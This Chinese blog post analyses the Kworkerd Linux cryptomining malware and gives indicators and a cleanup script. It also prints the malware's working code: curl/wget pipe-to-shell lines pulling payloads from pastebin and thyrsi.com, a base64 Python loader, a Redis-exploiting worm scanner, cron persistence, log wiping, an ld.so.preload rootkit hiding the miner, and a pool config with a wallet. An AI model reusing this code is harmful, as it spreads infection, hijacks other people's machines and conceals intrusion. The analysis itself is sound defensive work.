# Kworkerd恶意挖矿分析

阅读量 **496346**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-09-13 16:30:10

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01f871abec2a2d4e12.jpg)

## 0x01 快速特征排查

TOP显示CPU占用高，但是没有高占用的进程  

存在与未知服务器13531端口建立的TCP连接  

文件/etc/ld.so.preload中指向了/usr/local/lib/libntp.so  

存在可疑执行base64编码的python进程  

## 0x02 快速清除

    
    
    #!/bin/bash
    ps aux|grep "I2NvZGluZzogdXRmLTg"|grep -v grep|awk '{print $2}'|xargs kill -9
    
    echo "" > /etc/cron.d/root
    echo "" > /etc/cron.d/system
    echo "" > /var/spool/cron/root
    echo "" > /var/spool/cron/crontabs/root
    rm -rf /etc/cron.hourly/oanacron
    rm -rf /etc/cron.daily/oanacron
    rm -rf /etc/cron.monthly/oanacron
    
    rm -rf /bin/httpdns
    sed -i '$d' /etc/crontab
    
    sed -i '$d' /etc/ld.so.preload
    rm -rf /usr/local/lib/libntp.so
    
    ps aux|grep kworkerds|grep -v color|awk '{print $2}'|xargs kill -9
    rm -rf /tmp/.tmph
    rm -rf /bin/kworkerds
    rm -rf /tmp/kworkerds
    rm -rf /usr/sbin/kworkerds
    rm -rf /etc/init.d/kworker
    chkconfig --del kworker
    

## 0x03 细节行为分析

搜索引擎查找相关问题，也有不少人碰到，比如：  

首先，CPU占用率100%，但是top命令查看，无法看到高占用进程，怀疑植入了rootkit。  
查看crontab的内容，已经被写入了一个定时任务，每半小时左右会从pastebin上下载脚本并且执行（pastebin是任意上传分享的平台，攻击者借此实现匿名）  
<https://pastebin.com/raw/xbY7p5Tb>  
拿到xbY7p5Tb脚本内容如下：  

    
    
    (curl -fsSL https://pastebin.com/raw/Gw7mywhC || wget -q-O- https://pastebin.com/raw/Gw7mywhC)|base64 -d |/bin/bash
    

脚本中再次下载了另一个脚本，并且对脚本内容进行base64解码后执行:  

脚本主要逻辑提取内容如下（省略了一堆调用的函数）：

    
    
    update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/TzBeq3AM )
    if [ ${update}x = "update"x ];then
        echocron
    else
        if [ ! -f "/tmp/.tmph" ]; then
            rm -rf /tmp/.tmpg
            python
        fi
        kills
        downloadrun
        echocron
        system
        top
        sleep 10
        port=$(netstat -anp | grep :13531 | wc -l)
        if [ ${port} -eq 0 ];then
            downloadrunxm
        fi
        echo 0>/var/spool/mail/root
        echo 0>/var/log/wtmp
        echo 0>/var/log/secure
        echo 0>/var/log/cron
    fi
    #
    #
    #
    

该恶意脚本首先检查更新，如果有更新，执行echocron进行更新操作  
<https://pastebin.com/raw/TzBeq3AM>

![](https://www.yourhome.ren/usr/uploads/2018/09/680712567.png)

接着检查了/tmp/.tmph文件是否存在，如果存在则删除，并且执行python函数  
名为Python的函数在脚本中为：

    
    
    function python() {
        nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSa3JTUWZFJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz'))" >/dev/null 2>&1 &
        touch /tmp/.tmph
    

其中执行的python代码经过了base64编码，解码后内容为：

    
    
    #coding: utf-8
    import urllib
    import base64
    
    d= 'https://pastebin.com/raw/nYBpuAxT'
    try:
        page=base64.b64decode(urllib.urlopen(d).read())
    exec(page)
    except:
    pass
    

这段python代码又从[https://pastebin.com/raw/nYBpuAxT读取了内容，并且进行了执行：](https://pastebin.com/raw/nYBpuAxT%E8%AF%BB%E5%8F%96%E4%BA%86%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B9%B6%E4%B8%94%E8%BF%9B%E8%A1%8C%E4%BA%86%E6%89%A7%E8%A1%8C%EF%BC%9A)  

再次base64解码后的最终代码内容如下，是一个针对redis的扫描攻击脚本，用于扩散感染：

    
    
    #! /usr/bin/env python
    #coding: utf-8
    
    import threading
    import socket
    from re import findall
    import httplib
    
    IP_LIST = []
    
    class scanner(threading.Thread):
        tlist = []
        maxthreads = 20
        evnt = threading.Event()
        lck = threading.Lock()
    
        def __init__(self,host):
            threading.Thread.__init__(self)
            self.host = host
        def run(self):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.host, 6379))
                s.send('set backup1 "\n\n\n*/1 * * * * curl -fsSL https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('set backup2 "\n\n\n*/1 * * * * wget -q -O- https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('config set dir /var/spool/cronrn')
                s.send('config set dbfilename rootrn')
                s.send('savern')
                s.close()
            except Exception as e:
                pass
            scanner.lck.acquire()
            scanner.tlist.remove(self)
            if len(scanner.tlist) < scanner.maxthreads:
                scanner.evnt.set()
                scanner.evnt.clear()
            scanner.lck.release()
    
        def newthread(host):
            scanner.lck.acquire()
            sc = scanner(host)
            scanner.tlist.append(sc)
            scanner.lck.release()
            sc.start()
    
        newthread = staticmethod(newthread)
    
    def get_ip_list():
        try:
            url = 'ident.me'
            conn = httplib.HTTPConnection(url, port=80, timeout=10)
            req = conn.request(method='GET', url='/', )
            result = conn.getresponse()
            ip2 = result.read()
            ips2 = findall(r'd+.d+.', ip2)[0][:-2]
            for u in range(0, 10):
                ip_list1 = (ips2 + (str(u)) +'.')
                for i in range(0, 256):
                    ip_list2 = (ip_list1 + (str(i)))
                    for g in range(0, 256):
                        IP_LIST.append(ip_list2 + '.' + (str(g)))
        except Exception:
            pass
    
    def runPortscan():
        get_ip_list()
        for host in IP_LIST:
            scanner.lck.acquire()
            if len(scanner.tlist) >= scanner.maxthreads:
                scanner.lck.release()
                scanner.evnt.wait()
            else:
                scanner.lck.release()
            scanner.newthread(host)
        for t in scanner.tlist:
            t.join()
    
    if __name__ == "__main__":
        runPortscan()
    

上述攻击脚本中，关键代码如下，通过扫描redis的6379端口，如果没有做访问验证，则直接进行远程命令执行进行感染。

    
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.host, 6379))
                s.send('set backup1 "\n\n\n*/1 * * * * curl -fsSL https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('set backup2 "\n\n\n*/1 * * * * wget -q -O- https://pastebin.com/raw/xbY7p5Tb|sh\n\n\n"rn')
                s.send('config set dir /var/spool/cronrn')
                s.send('config set dbfilename rootrn')
                s.send('savern')
                s.close()
    

主逻辑中的python函数执行完毕，接着执行主要逻辑代码：

    
    
    if [ ! -f "/tmp/.tmph" ]; then
            rm -rf /tmp/.tmpg
            python
        fi
        kills
        downloadrun
        echocron
        system
        top
        sleep 10
        port=$(netstat -anp | grep :13531 | wc -l)
        if [ ${port} -eq 0 ];then
            downloadrunxm
        fi
        echo 0>/var/spool/mail/root
        echo 0>/var/log/wtmp
        echo 0>/var/log/secure
        echo 0>/var/log/cron
    

kills函数主要是检查是否有其他挖矿等程序在运行，直接干掉，这里不做重点代码内容展示

downloadrun函数的内容如下，从thyrsi.com中下载了一个伪装为jpg的文件，保存为/tmp下的kworkerds并执行：

    
    
    function downloadrun() {
        ps=$(netstat -anp | grep :13531 | wc -l)
        if [ ${ps} -eq 0 ];then
            if [ ! -f "/tmp/kworkerds" ]; then
                curl -fsSL http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -o /tmp/kworkerds && chmod 777 /tmp/kworkerds
                if [ ! -f "/tmp/kworkerds" ]; then
                    wget http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -O /tmp/kworkerds && chmod 777 /tmp/kworkerds
                fi
                    nohup /tmp/kworkerds >/dev/null 2>&1 &
            else
                nohup /tmp/kworkerds >/dev/null 2>&1 &
            fi
        fi
    }
    

Kworkerds文件是挖矿本体程序，拿到后扔进virustotal检查结果：  

![](https://www.yourhome.ren/usr/uploads/2018/09/3065366807.png)

接着执行echocron函数，该函数在各个定时任务文件中写入下载恶意脚本并执行的任务，并且清除相关日志，这样加大了清理的难度:  

    
    
    echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|shn##" > /etc/cron.d/root
        echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|shn##" > /etc/cron.d/system
        echo -e "*/23 * * * *    (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|shn##" > /var/spool/cron/root
        mkdir -p /var/spool/cron/crontabs
        echo -e "*/31 * * * *    (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|shn##" > /var/spool/cron/crontabs/root
        mkdir -p /etc/cron.hourly
        curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
        if [ ! -f "/etc/cron.hourly/oanacron" ]; then
            wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
        fi
        mkdir -p /etc/cron.daily
        curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
        if [ ! -f "/etc/cron.daily/oanacron" ]; then
            wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
        fi
        mkdir -p /etc/cron.monthly
        curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
        if [ ! -f "/etc/cron.monthly/oanacron" ]; then
            wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
        fi
        touch -acmr /bin/sh /var/spool/cron/root
        touch -acmr /bin/sh /var/spool/cron/crontabs/root
        touch -acmr /bin/sh /etc/cron.d/system
        touch -acmr /bin/sh /etc/cron.d/root
        touch -acmr /bin/sh /etc/cron.hourly/oanacron
        touch -acmr /bin/sh /etc/cron.daily/oanacron
        touch -acmr /bin/sh /etc/cron.monthly/oanacron
    

之后执行system和top函数,system函数中下载了一个恶意的脚本文件放置在/bin目录下，并且写入定时任务。

    
    
    function system() {
        if [ ! -f "/bin/httpdns" ]; then
            curl -fsSL https://pastebin.com/raw/Fj2YdETv -o /bin/httpdns && chmod 755 /bin/httpdns
            if [ ! -f "/bin/httpdns" ]; then
                wget  https://pastebin.com/raw/Fj2YdETv -O /bin/httpdns && chmod 755 /bin/httpdns
            fi
            if [ ! -f "/etc/crontab" ]; then
                echo -e "0 1 * * * root /bin/httpdns" >> /etc/crontab
            else
                sed -i '$d' /etc/crontab && echo -e "0 1 * * * root /bin/httpdns" >> /etc/crontab
            fi
        fi
    }
    

其中httpdns的内容为:  

改脚本再次下载了一个脚本进行执行，脚本内容与上面主脚本内容类似（删减了kills system top几个函数；增加了init函数，即下载执行挖矿程序）：  

Top函数主要进行了rootkit的行为。  
函数将伪装为jpg的恶意链接库文件下载，首先放置在/usr/local/lib目录下，之后替换/etc/ld.so.preload文件，通过预加载劫持linux系统函数，使得top、ps等命令无法找到挖矿进程；  

**关于preload预加载恶意动态链接相关，可以阅读此文参考：**

<https://blog.csdn.net/aganlengzi/article/details/21824553>

最后通过touch–acmr命令，掩盖刚刚执行的操作（使得文件存取时间和变动时间与/bin/sh的日期一致，避免被怀疑）

    
    
    function top() {
        mkdir -p /usr/local/lib/
        if [ ! -f "/usr/local/lib/libntp.so" ]; then
            curl -fsSL http://thyrsi.com/t6/365/1535595427x-1404817712.jpg -o /usr/local/lib/libntp.so && chmod 755 /usr/local/lib/libntp.so
            if [ ! -f "/usr/local/lib/libntp.so" ]; then
                wget http://thyrsi.com/t6/365/1535595427x-1404817712.jpg -O /usr/local/lib/libntp.so && chmod 755 /usr/local/lib/libntp.so
            fi
        fi
        if [ ! -f "/etc/ld.so.preload" ]; then
            echo /usr/local/lib/libntp.so > /etc/ld.so.preload
        else
            sed -i '$d' /etc/ld.so.preload && echo /usr/local/lib/libntp.so >> /etc/ld.so.preload
        fi
        touch -acmr /bin/sh /etc/ld.so.preload
        touch -acmr /bin/sh /usr/local/lib/libntp.so
    

执行上述函数后，主脚本sleep10秒，判断是否与13531端口建立了连接，如果没有，则执行downloadrunxm函数（之后可以看到，13531是与连接的矿池端口）。  
Downloadrunxm函数中，同样下载了一个伪装的jpg文件，另存为/bin/config.json，又再次下载了kworkerds并且执行：

    
    
    function downloadrunxm() {
        pm=$(netstat -anp | grep :13531 | wc -l)
        if [ ${pm} -eq 0 ];then
            if [ ! -f "/bin/config.json" ]; then
                curl -fsSL http://thyrsi.com/t6/358/1534496022x-1404764583.jpg -o /bin/config.json && chmod 777 /bin/config.json
                if [ ! -f "/bin/config.json" ]; then
                    wget http://thyrsi.com/t6/358/1534496022x-1404764583.jpg -O /bin/config.json && chmod 777 /bin/config.json
                fi
            fi
            if [ ! -f "/bin/kworkerds" ]; then
                curl -fsSL http://thyrsi.com/t6/358/1534491798x-1404764420.jpg -o /bin/kworkerds && chmod 777 /bin/kworkerds
                if [ ! -f "/bin/kworkerds" ]; then
                    wget http://thyrsi.com/t6/358/1534491798x-1404764420.jpg -O /bin/kworkerds && chmod 777 /bin/kworkerds
                fi
                    nohup /bin/kworkerds >/dev/null 2>&1 &
            else
                nohup /bin/kworkerds >/dev/null 2>&1 &
            fi
        fi
    }
    

拿到的config.json的内容如下：

    
    
    {
        "algo": "cryptonight",
        "api": {
            "port": 0,
            "access-token": null,
            "worker-id": null,
            "ipv6": false,
            "restricted": true
        },
        "av": 0,
        "background": false,
        "colors": true,
        "cpu-affinity": null,
        "cpu-priority": null,
        "donate-level": 0,
        "huge-pages": true,
        "hw-aes": null,
        "log-file": null,
        "max-cpu-usage": 100,
        "pools": [
            {
                "url": "stratum+tcp://xmr.f2pool.com:13531",
                "user": "47eCpELDZBiVoxDT1tBxCX7fFU4kcSTDLTW2FzYTuB1H3yzrKTtXLAVRsBWcsYpfQzfHjHKtQAJshNyTU88LwNY4Q3rHFYA.xmrig",
                "pass": "x",
                "rig-id": null,
                "nicehash": false,
                "keepalive": false,
                "variant": 1
            }
        ],
        "print-time": 60,
        "retries": 5,
        "retry-pause": 5,
        "safe": false,
        "threads": null,
        "user-agent": null,
        "watch": false
    }
    

连接的矿池为国内的f2pool.com鱼池：  

## 0x04 样本收集分享

搜集遇到的恶意挖矿repo：  
<https://github.com/MRdoulestar/whatMiner>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **yunsle** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/159497](/post/id/159497)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [挖矿](/tag/挖矿)
  * [kworkerd](/tag/kworkerd)

 **+1** __10赞

 __收藏

![](https://p3.ssl.qhimg.com/t018d078a0ca4861591.jpg) yunsle

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

